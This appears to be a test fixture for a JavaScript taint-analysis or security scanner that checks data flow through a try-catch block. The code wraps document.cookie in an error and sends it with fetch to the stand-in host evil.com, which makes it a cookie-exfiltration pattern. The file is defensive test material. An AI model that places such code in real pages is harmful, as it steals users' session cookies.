/**
 * Test: Taint through try-catch
 * Expected: VULNERABILITY - cookie in catch block to fetch
 */

function test() {
  try {
    throw new Error(document.cookie);
  } catch(e) {
    fetch('https://evil.com?error=' + e.message);
  }
}

test();
